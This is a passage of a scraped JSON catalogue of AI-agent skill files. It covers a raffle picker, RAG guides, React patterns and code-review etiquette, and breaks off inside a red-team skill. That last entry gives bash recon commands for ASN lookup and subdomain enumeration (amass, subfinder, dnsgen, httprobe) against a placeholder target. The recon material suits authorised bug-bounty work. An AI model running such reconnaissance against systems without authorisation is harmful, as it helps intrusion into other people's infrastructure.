      "content": "\n# Raffle Winner Picker\n\nThis skill randomly selects winners from lists, spreadsheets, or Google Sheets for giveaways and contests.\n\n## When to Use This Skill\n\n- Running social media giveaways\n- Picking raffle winners at events\n- Randomly selecting participants for surveys or tests\n- Choosing winners from contest submissions\n- Fair distribution of limited spots or resources\n- Random team assignments\n\n## What This Skill Does\n\n1. **Random Selection**: Uses cryptographically random selection\n2. **Multiple Sources**: Works with CSV, Excel, Google Sheets, or plain lists\n3. **Multiple Winners**: Can pick one or multiple winners\n4. **Duplicate Prevention**: Ensures the same person can't win twice\n5. **Transparent Results**: Shows the selection process clearly\n6. **Winner Details**: Displays all relevant information about winners\n\n## How to Use\n\n### From Google Sheets\n\n```\nPick a random row from this Google Sheet to select a winner \nfor a giveaway: [Sheet URL]\n```\n\n### From Local File\n\n```\nPick 3 random winners from entries.csv\n```\n\n### From List\n\n```\nPick a random winner from this list:\n- Alice (alice@email.com)\n- Bob (bob@email.com)\n- Carol (carol@email.com)\n...\n```\n\n### Multiple Winners\n\n```\nPick 5 random winners from contest-entries.xlsx, \nmake sure no duplicates\n```\n\n## Example\n\n**User**: \"Pick a random row from this Google Sheet to select a winner for a giveaway.\"\n\n**Output**:\n```\nAccessing Google Sheet...\nTotal entries found: 247\n\nRandomly selecting winner...\n\n🎉 WINNER SELECTED! 🎉\n\nRow #142\nName: Sarah Johnson\nEmail: sarah.j@email.com\nEntry Date: March 10, 2024\nComment: \"Love your newsletter!\"\n\nSelection method: Cryptographically random\nTimestamp: 2024-03-15 14:32:18 UTC\n\nWould you like to:\n- Pick another winner (excluding Sarah)?\n- Export winner details?\n- Pick runner-ups?\n```\n\n**Inspired by:** Lenny's use case - picking a Sora 2 giveaway winner from his subscriber Slack community\n\n## Features\n\n### Fair Selection\n- Uses secure random number generation\n- No bias or patterns\n- Transparent process\n- Repeatable with seed (for verification)\n\n### Exclusions\n```\nPick a random winner excluding previous winners: \nAlice, Bob, Carol\n```\n\n### Weighted Selection\n```\nPick a winner with weighted probability based on \nthe \"entries\" column (1 entry = 1 ticket)\n```\n\n### Runner-ups\n```\nPick 1 winner and 3 runner-ups from the list\n```\n\n## Example Workflows\n\n### Social Media Giveaway\n1. Export entries from Google Form to Sheets\n2. \"Pick a random winner from [Sheet URL]\"\n3. Verify winner details\n4. Announce publicly with timestamp\n\n### Event Raffle\n1. Create CSV of attendee names and emails\n2. \"Pick 10 random winners from attendees.csv\"\n3. Export winner list\n4. Email winners directly\n\n### Team Assignment\n1. Have list of participants\n2. \"Randomly split this list into 4 equal teams\"\n3. Review assignments\n4. Share team rosters\n\n## Tips\n\n- **Document the process**: Save the timestamp and method\n- **Public announcement**: Share selection details for transparency\n- **Check eligibility**: Verify winner meets contest rules\n- **Have backups**: Pick runner-ups in case winner is ineligible\n- **Export results**: Save winner list for records\n\n## Privacy & Fairness\n\n✓ Uses cryptographically secure randomness\n✓ No manipulation possible\n✓ Timestamp recorded for verification\n✓ Can provide seed for third-party verification\n✓ Respects data privacy\n\n## Common Use Cases\n\n- Newsletter subscriber giveaways\n- Product launch raffles\n- Conference ticket drawings\n- Beta tester selection\n- Focus group participant selection\n- Random prize distribution at events\n\n",
      "tags": [
        "xlsx",
        "ai",
        "workflow",
        "slack",
        "raffle",
        "winner",
        "picker"
      ],
      "useCases": [
        "Running social media giveaways",
        "Picking raffle winners at events",
        "Randomly selecting participants for surveys or tests",
        "Choosing winners from contest submissions",
        "Fair distribution of limited spots or resources"
      ],
      "scrapedAt": "2026-01-26T13:16:01.940Z"
    },
    {
      "id": "antigravity-rag-engineer",
      "name": "rag-engineer",
      "slug": "rag-engineer",
      "description": "Expert in building Retrieval-Augmented Generation systems. Masters embedding models, vector databases, chunking strategies, and retrieval optimization for LLM applications. Use when: building RAG, vector search, embeddings, semantic search, document retrieval.",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/rag-engineer",
      "content": "\n# RAG Engineer\n\n**Role**: RAG Systems Architect\n\nI bridge the gap between raw documents and LLM understanding. I know that\nretrieval quality determines generation quality - garbage in, garbage out.\nI obsess over chunking boundaries, embedding dimensions, and similarity\nmetrics because they make the difference between helpful and hallucinating.\n\n## Capabilities\n\n- Vector embeddings and similarity search\n- Document chunking and preprocessing\n- Retrieval pipeline design\n- Semantic search implementation\n- Context window optimization\n- Hybrid search (keyword + semantic)\n\n## Requirements\n\n- LLM fundamentals\n- Understanding of embeddings\n- Basic NLP concepts\n\n## Patterns\n\n### Semantic Chunking\n\nChunk by meaning, not arbitrary token counts\n\n```javascript\n- Use sentence boundaries, not token limits\n- Detect topic shifts with embedding similarity\n- Preserve document structure (headers, paragraphs)\n- Include overlap for context continuity\n- Add metadata for filtering\n```\n\n### Hierarchical Retrieval\n\nMulti-level retrieval for better precision\n\n```javascript\n- Index at multiple chunk sizes (paragraph, section, document)\n- First pass: coarse retrieval for candidates\n- Second pass: fine-grained retrieval for precision\n- Use parent-child relationships for context\n```\n\n### Hybrid Search\n\nCombine semantic and keyword search\n\n```javascript\n- BM25/TF-IDF for keyword matching\n- Vector similarity for semantic matching\n- Reciprocal Rank Fusion for combining scores\n- Weight tuning based on query type\n```\n\n## Anti-Patterns\n\n### ❌ Fixed Chunk Size\n\n### ❌ Embedding Everything\n\n### ❌ Ignoring Evaluation\n\n## ⚠️ Sharp Edges\n\n| Issue | Severity | Solution |\n|-------|----------|----------|\n| Fixed-size chunking breaks sentences and context | high | Use semantic chunking that respects document structure: |\n| Pure semantic search without metadata pre-filtering | medium | Implement hybrid filtering: |\n| Using same embedding model for different content types | medium | Evaluate embeddings per content type: |\n| Using first-stage retrieval results directly | medium | Add reranking step: |\n| Cramming maximum context into LLM prompt | medium | Use relevance thresholds: |\n| Not measuring retrieval quality separately from generation | high | Separate retrieval evaluation: |\n| Not updating embeddings when source documents change | medium | Implement embedding refresh: |\n| Same retrieval strategy for all query types | medium | Implement hybrid search: |\n\n## Related Skills\n\nWorks well with: `ai-agents-architect`, `prompt-engineer`, `database-architect`, `backend`\n",
      "tags": [
        "javascript",
        "ai",
        "agent",
        "llm",
        "design",
        "document",
        "rag"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:21:04.070Z"
    },
    {
      "id": "antigravity-rag-implementation",
      "name": "rag-implementation",
      "slug": "rag-implementation",
      "description": "Retrieval-Augmented Generation patterns including chunking, embeddings, vector stores, and retrieval optimization Use when: rag, retrieval augmented, vector search, embeddings, semantic search.",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/rag-implementation",
      "content": "\n# RAG Implementation\n\nYou're a RAG specialist who has built systems serving millions of queries over\nterabytes of documents. You've seen the naive \"chunk and embed\" approach fail,\nand developed sophisticated chunking, retrieval, and reranking strategies.\n\nYou understand that RAG is not just vector search—it's about getting the right\ninformation to the LLM at the right time. You know when RAG helps and when\nit's unnecessary overhead.\n\nYour core principles:\n1. Chunking is critical—bad chunks mean bad retrieval\n2. Hybri\n\n## Capabilities\n\n- document-chunking\n- embedding-models\n- vector-stores\n- retrieval-strategies\n- hybrid-search\n- reranking\n\n## Patterns\n\n### Semantic Chunking\n\nChunk by meaning, not arbitrary size\n\n### Hybrid Search\n\nCombine dense (vector) and sparse (keyword) search\n\n### Contextual Reranking\n\nRerank retrieved docs with LLM for relevance\n\n## Anti-Patterns\n\n### ❌ Fixed-Size Chunking\n\n### ❌ No Overlap\n\n### ❌ Single Retrieval Strategy\n\n## ⚠️ Sharp Edges\n\n| Issue | Severity | Solution |\n|-------|----------|----------|\n| Poor chunking ruins retrieval quality | critical | // Use recursive character text splitter with overlap |\n| Query and document embeddings from different models | critical | // Ensure consistent embedding model usage |\n| RAG adds significant latency to responses | high | // Optimize RAG latency |\n| Documents updated but embeddings not refreshed | medium | // Maintain sync between documents and embeddings |\n\n## Related Skills\n\nWorks well with: `context-window-management`, `conversation-memory`, `prompt-caching`, `data-pipeline`\n",
      "tags": [
        "ai",
        "llm",
        "document",
        "rag"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:21:05.266Z"
    },
    {
      "id": "antigravity-react-patterns",
      "name": "react-patterns",
      "slug": "react-patterns",
      "description": "Modern React patterns and principles. Hooks, composition, performance, TypeScript best practices.",
      "category": "Development & Code Tools",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/react-patterns",
      "content": "\n# React Patterns\n\n> Principles for building production-ready React applications.\n\n---\n\n## 1. Component Design Principles\n\n### Component Types\n\n| Type | Use | State |\n|------|-----|-------|\n| **Server** | Data fetching, static | None |\n| **Client** | Interactivity | useState, effects |\n| **Presentational** | UI display | Props only |\n| **Container** | Logic/state | Heavy state |\n\n### Design Rules\n\n- One responsibility per component\n- Props down, events up\n- Composition over inheritance\n- Prefer small, focused components\n\n---\n\n## 2. Hook Patterns\n\n### When to Extract Hooks\n\n| Pattern | Extract When |\n|---------|-------------|\n| **useLocalStorage** | Same storage logic needed |\n| **useDebounce** | Multiple debounced values |\n| **useFetch** | Repeated fetch patterns |\n| **useForm** | Complex form state |\n\n### Hook Rules\n\n- Hooks at top level only\n- Same order every render\n- Custom hooks start with \"use\"\n- Clean up effects on unmount\n\n---\n\n## 3. State Management Selection\n\n| Complexity | Solution |\n|------------|----------|\n| Simple | useState, useReducer |\n| Shared local | Context |\n| Server state | React Query, SWR |\n| Complex global | Zustand, Redux Toolkit |\n\n### State Placement\n\n| Scope | Where |\n|-------|-------|\n| Single component | useState |\n| Parent-child | Lift state up |\n| Subtree | Context |\n| App-wide | Global store |\n\n---\n\n## 4. React 19 Patterns\n\n### New Hooks\n\n| Hook | Purpose |\n|------|---------|\n| **useActionState** | Form submission state |\n| **useOptimistic** | Optimistic UI updates |\n| **use** | Read resources in render |\n\n### Compiler Benefits\n\n- Automatic memoization\n- Less manual useMemo/useCallback\n- Focus on pure components\n\n---\n\n## 5. Composition Patterns\n\n### Compound Components\n\n- Parent provides context\n- Children consume context\n- Flexible slot-based composition\n- Example: Tabs, Accordion, Dropdown\n\n### Render Props vs Hooks\n\n| Use Case | Prefer |\n|----------|--------|\n| Reusable logic | Custom hook |\n| Render flexibility | Render props |\n| Cross-cutting | Higher-order component |\n\n---\n\n## 6. Performance Principles\n\n### When to Optimize\n\n| Signal | Action |\n|--------|--------|\n| Slow renders | Profile first |\n| Large lists | Virtualize |\n| Expensive calc | useMemo |\n| Stable callbacks | useCallback |\n\n### Optimization Order\n\n1. Check if actually slow\n2. Profile with DevTools\n3. Identify bottleneck\n4. Apply targeted fix\n\n---\n\n## 7. Error Handling\n\n### Error Boundary Usage\n\n| Scope | Placement |\n|-------|-----------|\n| App-wide | Root level |\n| Feature | Route/feature level |\n| Component | Around risky component |\n\n### Error Recovery\n\n- Show fallback UI\n- Log error\n- Offer retry option\n- Preserve user data\n\n---\n\n## 8. TypeScript Patterns\n\n### Props Typing\n\n| Pattern | Use |\n|---------|-----|\n| Interface | Component props |\n| Type | Unions, complex |\n| Generic | Reusable components |\n\n### Common Types\n\n| Need | Type |\n|------|------|\n| Children | ReactNode |\n| Event handler | MouseEventHandler |\n| Ref | RefObject<Element> |\n\n---\n\n## 9. Testing Principles\n\n| Level | Focus |\n|-------|-------|\n| Unit | Pure functions, hooks |\n| Integration | Component behavior |\n| E2E | User flows |\n\n### Test Priorities\n\n- User-visible behavior\n- Edge cases\n- Error states\n- Accessibility\n\n---\n\n## 10. Anti-Patterns\n\n| ❌ Don't | ✅ Do |\n|----------|-------|\n| Prop drilling deep | Use context |\n| Giant components | Split smaller |\n| useEffect for everything | Server components |\n| Premature optimization | Profile first |\n| Index as key | Stable unique ID |\n\n---\n\n> **Remember:** React is about composition. Build small, combine thoughtfully.\n",
      "tags": [
        "typescript",
        "react",
        "node",
        "ai",
        "design",
        "presentation",
        "rag",
        "seo",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:21:09.419Z"
    },
    {
      "id": "antigravity-react-ui-patterns",
      "name": "react-ui-patterns",
      "slug": "react-ui-patterns",
      "description": "Modern React UI patterns for loading states, error handling, and data fetching. Use when building UI components, handling async data, or managing UI states.",
      "category": "Creative & Media",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/react-ui-patterns",
      "content": "\n# React UI Patterns\n\n## Core Principles\n\n1. **Never show stale UI** - Loading spinners only when actually loading\n2. **Always surface errors** - Users must know when something fails\n3. **Optimistic updates** - Make the UI feel instant\n4. **Progressive disclosure** - Show content as it becomes available\n5. **Graceful degradation** - Partial data is better than no data\n\n## Loading State Patterns\n\n### The Golden Rule\n\n**Show loading indicator ONLY when there's no data to display.**\n\n```typescript\n// CORRECT - Only show loading when no data exists\nconst { data, loading, error } = useGetItemsQuery();\n\nif (error) return <ErrorState error={error} onRetry={refetch} />;\nif (loading && !data) return <LoadingState />;\nif (!data?.items.length) return <EmptyState />;\n\nreturn <ItemList items={data.items} />;\n```\n\n```typescript\n// WRONG - Shows spinner even when we have cached data\nif (loading) return <LoadingState />; // Flashes on refetch!\n```\n\n### Loading State Decision Tree\n\n```\nIs there an error?\n  → Yes: Show error state with retry option\n  → No: Continue\n\nIs it loading AND we have no data?\n  → Yes: Show loading indicator (spinner/skeleton)\n  → No: Continue\n\nDo we have data?\n  → Yes, with items: Show the data\n  → Yes, but empty: Show empty state\n  → No: Show loading (fallback)\n```\n\n### Skeleton vs Spinner\n\n| Use Skeleton When | Use Spinner When |\n|-------------------|------------------|\n| Known content shape | Unknown content shape |\n| List/card layouts | Modal actions |\n| Initial page load | Button submissions |\n| Content placeholders | Inline operations |\n\n## Error Handling Patterns\n\n### The Error Handling Hierarchy\n\n```\n1. Inline error (field-level) → Form validation errors\n2. Toast notification → Recoverable errors, user can retry\n3. Error banner → Page-level errors, data still partially usable\n4. Full error screen → Unrecoverable, needs user action\n```\n\n### Always Show Errors\n\n**CRITICAL: Never swallow errors silently.**\n\n```typescript\n// CORRECT - Error always surfaced to user\nconst [createItem, { loading }] = useCreateItemMutation({\n  onCompleted: () => {\n    toast.success({ title: 'Item created' });\n  },\n  onError: (error) => {\n    console.error('createItem failed:', error);\n    toast.error({ title: 'Failed to create item' });\n  },\n});\n\n// WRONG - Error silently caught, user has no idea\nconst [createItem] = useCreateItemMutation({\n  onError: (error) => {\n    console.error(error); // User sees nothing!\n  },\n});\n```\n\n### Error State Component Pattern\n\n```typescript\ninterface ErrorStateProps {\n  error: Error;\n  onRetry?: () => void;\n  title?: string;\n}\n\nconst ErrorState = ({ error, onRetry, title }: ErrorStateProps) => (\n  <div className=\"error-state\">\n    <Icon name=\"exclamation-circle\" />\n    <h3>{title ?? 'Something went wrong'}</h3>\n    <p>{error.message}</p>\n    {onRetry && (\n      <Button onClick={onRetry}>Try Again</Button>\n    )}\n  </div>\n);\n```\n\n## Button State Patterns\n\n### Button Loading State\n\n```tsx\n<Button\n  onClick={handleSubmit}\n  isLoading={isSubmitting}\n  disabled={!isValid || isSubmitting}\n>\n  Submit\n</Button>\n```\n\n### Disable During Operations\n\n**CRITICAL: Always disable triggers during async operations.**\n\n```tsx\n// CORRECT - Button disabled while loading\n<Button\n  disabled={isSubmitting}\n  isLoading={isSubmitting}\n  onClick={handleSubmit}\n>\n  Submit\n</Button>\n\n// WRONG - User can tap multiple times\n<Button onClick={handleSubmit}>\n  {isSubmitting ? 'Submitting...' : 'Submit'}\n</Button>\n```\n\n## Empty States\n\n### Empty State Requirements\n\nEvery list/collection MUST have an empty state:\n\n```tsx\n// WRONG - No empty state\nreturn <FlatList data={items} />;\n\n// CORRECT - Explicit empty state\nreturn (\n  <FlatList\n    data={items}\n    ListEmptyComponent={<EmptyState />}\n  />\n);\n```\n\n### Contextual Empty States\n\n```tsx\n// Search with no results\n<EmptyState\n  icon=\"search\"\n  title=\"No results found\"\n  description=\"Try different search terms\"\n/>\n\n// List with no items yet\n<EmptyState\n  icon=\"plus-circle\"\n  title=\"No items yet\"\n  description=\"Create your first item\"\n  action={{ label: 'Create Item', onClick: handleCreate }}\n/>\n```\n\n## Form Submission Pattern\n\n```tsx\nconst MyForm = () => {\n  const [submit, { loading }] = useSubmitMutation({\n    onCompleted: handleSuccess,\n    onError: handleError,\n  });\n\n  const handleSubmit = async () => {\n    if (!isValid) {\n      toast.error({ title: 'Please fix errors' });\n      return;\n    }\n    await submit({ variables: { input: values } });\n  };\n\n  return (\n    <form>\n      <Input\n        value={values.name}\n        onChange={handleChange('name')}\n        error={touched.name ? errors.name : undefined}\n      />\n      <Button\n        type=\"submit\"\n        onClick={handleSubmit}\n        disabled={!isValid || loading}\n        isLoading={loading}\n      >\n        Submit\n      </Button>\n    </form>\n  );\n};\n```\n\n## Anti-Patterns\n\n### Loading States\n\n```typescript\n// WRONG - Spinner when data exists (causes flash)\nif (loading) return <Spinner />;\n\n// CORRECT - Only show l",
      "tags": [
        "typescript",
        "react",
        "ai"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:21:10.646Z"
    },
    {
      "id": "superpowers-receiving-code-review",
      "name": "receiving-code-review",
      "slug": "superpowers-receiving-code-review",
      "description": "Use when receiving code review feedback, before implementing suggestions, especially if feedback seems unclear or technically questionable - requires technical rigor and verification, not performative agreement or blind implementation",
      "category": "Collaboration & Project Management",
      "source": "superpowers",
      "repoUrl": "https://github.com/obra/superpowers",
      "skillUrl": "https://github.com/obra/superpowers/tree/main/skills/receiving-code-review",
      "content": "\n# Code Review Reception\n\n## Overview\n\nCode review requires technical evaluation, not emotional performance.\n\n**Core principle:** Verify before implementing. Ask before assuming. Technical correctness over social comfort.\n\n## The Response Pattern\n\n```\nWHEN receiving code review feedback:\n\n1. READ: Complete feedback without reacting\n2. UNDERSTAND: Restate requirement in own words (or ask)\n3. VERIFY: Check against codebase reality\n4. EVALUATE: Technically sound for THIS codebase?\n5. RESPOND: Technical acknowledgment or reasoned pushback\n6. IMPLEMENT: One item at a time, test each\n```\n\n## Forbidden Responses\n\n**NEVER:**\n- \"You're absolutely right!\" (explicit CLAUDE.md violation)\n- \"Great point!\" / \"Excellent feedback!\" (performative)\n- \"Let me implement that now\" (before verification)\n\n**INSTEAD:**\n- Restate the technical requirement\n- Ask clarifying questions\n- Push back with technical reasoning if wrong\n- Just start working (actions > words)\n\n## Handling Unclear Feedback\n\n```\nIF any item is unclear:\n  STOP - do not implement anything yet\n  ASK for clarification on unclear items\n\nWHY: Items may be related. Partial understanding = wrong implementation.\n```\n\n**Example:**\n```\nyour human partner: \"Fix 1-6\"\nYou understand 1,2,3,6. Unclear on 4,5.\n\n❌ WRONG: Implement 1,2,3,6 now, ask about 4,5 later\n✅ RIGHT: \"I understand items 1,2,3,6. Need clarification on 4 and 5 before proceeding.\"\n```\n\n## Source-Specific Handling\n\n### From your human partner\n- **Trusted** - implement after understanding\n- **Still ask** if scope unclear\n- **No performative agreement**\n- **Skip to action** or technical acknowledgment\n\n### From External Reviewers\n```\nBEFORE implementing:\n  1. Check: Technically correct for THIS codebase?\n  2. Check: Breaks existing functionality?\n  3. Check: Reason for current implementation?\n  4. Check: Works on all platforms/versions?\n  5. Check: Does reviewer understand full context?\n\nIF suggestion seems wrong:\n  Push back with technical reasoning\n\nIF can't easily verify:\n  Say so: \"I can't verify this without [X]. Should I [investigate/ask/proceed]?\"\n\nIF conflicts with your human partner's prior decisions:\n  Stop and discuss with your human partner first\n```\n\n**your human partner's rule:** \"External feedback - be skeptical, but check carefully\"\n\n## YAGNI Check for \"Professional\" Features\n\n```\nIF reviewer suggests \"implementing properly\":\n  grep codebase for actual usage\n\n  IF unused: \"This endpoint isn't called. Remove it (YAGNI)?\"\n  IF used: Then implement properly\n```\n\n**your human partner's rule:** \"You and reviewer both report to me. If we don't need this feature, don't add it.\"\n\n## Implementation Order\n\n```\nFOR multi-item feedback:\n  1. Clarify anything unclear FIRST\n  2. Then implement in this order:\n     - Blocking issues (breaks, security)\n     - Simple fixes (typos, imports)\n     - Complex fixes (refactoring, logic)\n  3. Test each fix individually\n  4. Verify no regressions\n```\n\n## When To Push Back\n\nPush back when:\n- Suggestion breaks existing functionality\n- Reviewer lacks full context\n- Violates YAGNI (unused feature)\n- Technically incorrect for this stack\n- Legacy/compatibility reasons exist\n- Conflicts with your human partner's architectural decisions\n\n**How to push back:**\n- Use technical reasoning, not defensiveness\n- Ask specific questions\n- Reference working tests/code\n- Involve your human partner if architectural\n\n**Signal if uncomfortable pushing back out loud:** \"Strange things are afoot at the Circle K\"\n\n## Acknowledging Correct Feedback\n\nWhen feedback IS correct:\n```\n✅ \"Fixed. [Brief description of what changed]\"\n✅ \"Good catch - [specific issue]. Fixed in [location].\"\n✅ [Just fix it and show in the code]\n\n❌ \"You're absolutely right!\"\n❌ \"Great point!\"\n❌ \"Thanks for catching that!\"\n❌ \"Thanks for [anything]\"\n❌ ANY gratitude expression\n```\n\n**Why no thanks:** Actions speak. Just fix it. The code itself shows you heard the feedback.\n\n**If you catch yourself about to write \"Thanks\":** DELETE IT. State the fix instead.\n\n## Gracefully Correcting Your Pushback\n\nIf you pushed back and were wrong:\n```\n✅ \"You were right - I checked [X] and it does [Y]. Implementing now.\"\n✅ \"Verified this and you're correct. My initial understanding was wrong because [reason]. Fixing.\"\n\n❌ Long apology\n❌ Defending why you pushed back\n❌ Over-explaining\n```\n\nState the correction factually and move on.\n\n## Common Mistakes\n\n| Mistake | Fix |\n|---------|-----|\n| Performative agreement | State requirement or just act |\n| Blind implementation | Verify against codebase first |\n| Batch without testing | One at a time, test each |\n| Assuming reviewer is right | Check if breaks things |\n| Avoiding pushback | Technical correctness > comfort |\n| Partial implementation | Clarify all items first |\n| Can't verify, proceed anyway | State limitation, ask for direction |\n\n## Real Examples\n\n**Performative Agreement (Bad):**\n```\nReviewer: \"Remove legacy code\"\n❌ \"You're absolutely right! Let me remove that...\"\n```\n\n**Technical Verificatio",
      "tags": [
        "testing",
        "git",
        "code-review",
        "verification",
        "receiving",
        "code",
        "review"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:14:15.442Z"
    },
    {
      "id": "antigravity-receiving-code-review",
      "name": "receiving-code-review",
      "slug": "receiving-code-review",
      "description": "Use when receiving code review feedback, before implementing suggestions, especially if feedback seems unclear or technically questionable - requires technical rigor and verification, not performative agreement or blind implementation",
      "category": "Development & Code Tools",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/receiving-code-review",
      "content": "\n# Code Review Reception\n\n## Overview\n\nCode review requires technical evaluation, not emotional performance.\n\n**Core principle:** Verify before implementing. Ask before assuming. Technical correctness over social comfort.\n\n## The Response Pattern\n\n```\nWHEN receiving code review feedback:\n\n1. READ: Complete feedback without reacting\n2. UNDERSTAND: Restate requirement in own words (or ask)\n3. VERIFY: Check against codebase reality\n4. EVALUATE: Technically sound for THIS codebase?\n5. RESPOND: Technical acknowledgment or reasoned pushback\n6. IMPLEMENT: One item at a time, test each\n```\n\n## Forbidden Responses\n\n**NEVER:**\n- \"You're absolutely right!\" (explicit CLAUDE.md violation)\n- \"Great point!\" / \"Excellent feedback!\" (performative)\n- \"Let me implement that now\" (before verification)\n\n**INSTEAD:**\n- Restate the technical requirement\n- Ask clarifying questions\n- Push back with technical reasoning if wrong\n- Just start working (actions > words)\n\n## Handling Unclear Feedback\n\n```\nIF any item is unclear:\n  STOP - do not implement anything yet\n  ASK for clarification on unclear items\n\nWHY: Items may be related. Partial understanding = wrong implementation.\n```\n\n**Example:**\n```\nyour human partner: \"Fix 1-6\"\nYou understand 1,2,3,6. Unclear on 4,5.\n\n❌ WRONG: Implement 1,2,3,6 now, ask about 4,5 later\n✅ RIGHT: \"I understand items 1,2,3,6. Need clarification on 4 and 5 before proceeding.\"\n```\n\n## Source-Specific Handling\n\n### From your human partner\n- **Trusted** - implement after understanding\n- **Still ask** if scope unclear\n- **No performative agreement**\n- **Skip to action** or technical acknowledgment\n\n### From External Reviewers\n```\nBEFORE implementing:\n  1. Check: Technically correct for THIS codebase?\n  2. Check: Breaks existing functionality?\n  3. Check: Reason for current implementation?\n  4. Check: Works on all platforms/versions?\n  5. Check: Does reviewer understand full context?\n\nIF suggestion seems wrong:\n  Push back with technical reasoning\n\nIF can't easily verify:\n  Say so: \"I can't verify this without [X]. Should I [investigate/ask/proceed]?\"\n\nIF conflicts with your human partner's prior decisions:\n  Stop and discuss with your human partner first\n```\n\n**your human partner's rule:** \"External feedback - be skeptical, but check carefully\"\n\n## YAGNI Check for \"Professional\" Features\n\n```\nIF reviewer suggests \"implementing properly\":\n  grep codebase for actual usage\n\n  IF unused: \"This endpoint isn't called. Remove it (YAGNI)?\"\n  IF used: Then implement properly\n```\n\n**your human partner's rule:** \"You and reviewer both report to me. If we don't need this feature, don't add it.\"\n\n## Implementation Order\n\n```\nFOR multi-item feedback:\n  1. Clarify anything unclear FIRST\n  2. Then implement in this order:\n     - Blocking issues (breaks, security)\n     - Simple fixes (typos, imports)\n     - Complex fixes (refactoring, logic)\n  3. Test each fix individually\n  4. Verify no regressions\n```\n\n## When To Push Back\n\nPush back when:\n- Suggestion breaks existing functionality\n- Reviewer lacks full context\n- Violates YAGNI (unused feature)\n- Technically incorrect for this stack\n- Legacy/compatibility reasons exist\n- Conflicts with your human partner's architectural decisions\n\n**How to push back:**\n- Use technical reasoning, not defensiveness\n- Ask specific questions\n- Reference working tests/code\n- Involve your human partner if architectural\n\n**Signal if uncomfortable pushing back out loud:** \"Strange things are afoot at the Circle K\"\n\n## Acknowledging Correct Feedback\n\nWhen feedback IS correct:\n```\n✅ \"Fixed. [Brief description of what changed]\"\n✅ \"Good catch - [specific issue]. Fixed in [location].\"\n✅ [Just fix it and show in the code]\n\n❌ \"You're absolutely right!\"\n❌ \"Great point!\"\n❌ \"Thanks for catching that!\"\n❌ \"Thanks for [anything]\"\n❌ ANY gratitude expression\n```\n\n**Why no thanks:** Actions speak. Just fix it. The code itself shows you heard the feedback.\n\n**If you catch yourself about to write \"Thanks\":** DELETE IT. State the fix instead.\n\n## Gracefully Correcting Your Pushback\n\nIf you pushed back and were wrong:\n```\n✅ \"You were right - I checked [X] and it does [Y]. Implementing now.\"\n✅ \"Verified this and you're correct. My initial understanding was wrong because [reason]. Fixing.\"\n\n❌ Long apology\n❌ Defending why you pushed back\n❌ Over-explaining\n```\n\nState the correction factually and move on.\n\n## Common Mistakes\n\n| Mistake | Fix |\n|---------|-----|\n| Performative agreement | State requirement or just act |\n| Blind implementation | Verify against codebase first |\n| Batch without testing | One at a time, test each |\n| Assuming reviewer is right | Check if breaks things |\n| Avoiding pushback | Technical correctness > comfort |\n| Partial implementation | Clarify all items first |\n| Can't verify, proceed anyway | State limitation, ask for direction |\n\n## Real Examples\n\n**Performative Agreement (Bad):**\n```\nReviewer: \"Remove legacy code\"\n❌ \"You're absolutely right! Let me remove that...\"\n```\n\n**Technical Verificatio",
      "tags": [
        "react",
        "api",
        "claude",
        "ai",
        "security"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:21:11.839Z"
    },
    {
      "id": "antigravity-red-team-tools",
      "name": "Red Team Tools and Methodology",
      "slug": "red-team-tools",
      "description": "This skill should be used when the user asks to \"follow red team methodology\", \"perform bug bounty hunting\", \"automate reconnaissance\", \"hunt for XSS vulnerabilities\", \"enumerate subdomains\", or needs security researcher techniques and tool configurations from top bug bounty hunters.",
      "category": "Security & Systems",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/red-team-tools",
      "content": "\n# Red Team Tools and Methodology\n\n## Purpose\n\nImplement proven methodologies and tool workflows from top security researchers for effective reconnaissance, vulnerability discovery, and bug bounty hunting. Automate common tasks while maintaining thorough coverage of attack surfaces.\n\n## Inputs/Prerequisites\n\n- Target scope definition (domains, IP ranges, applications)\n- Linux-based attack machine (Kali, Ubuntu)\n- Bug bounty program rules and scope\n- Tool dependencies installed (Go, Python, Ruby)\n- API keys for various services (Shodan, Censys, etc.)\n\n## Outputs/Deliverables\n\n- Comprehensive subdomain enumeration\n- Live host discovery and technology fingerprinting\n- Identified vulnerabilities and attack vectors\n- Automated recon pipeline outputs\n- Documented findings for reporting\n\n## Core Workflow\n\n### 1. Project Tracking and Acquisitions\n\nSet up reconnaissance tracking:\n\n```bash\n# Create project structure\nmkdir -p target/{recon,vulns,reports}\ncd target\n\n# Find acquisitions using Crunchbase\n# Search manually for subsidiary companies\n\n# Get ASN for targets\namass intel -org \"Target Company\" -src\n\n# Alternative ASN lookup\ncurl -s \"https://bgp.he.net/search?search=targetcompany&commit=Search\"\n```\n\n### 2. Subdomain Enumeration\n\nComprehensive subdomain discovery:\n\n```bash\n# Create wildcards file\necho \"target.com\" > wildcards\n\n# Run Amass passively\namass enum -passive -d target.com -src -o amass_passive.txt\n\n# Run Amass actively\namass enum -active -d target.com -src -o amass_active.txt\n\n# Use Subfinder\nsubfinder -d target.com -silent -o subfinder.txt\n\n# Asset discovery\ncat wildcards | assetfinder --subs-only | anew domains.txt\n\n# Alternative subdomain tools\nfindomain -t target.com -o\n\n# Generate permutations with dnsgen\ncat domains.txt | dnsgen - | httprobe > permuted.txt\n\n# Combine all sources\ncat amass_*.txt subfinder.txt | sort -u > all_subs.txt\n```\n\n### 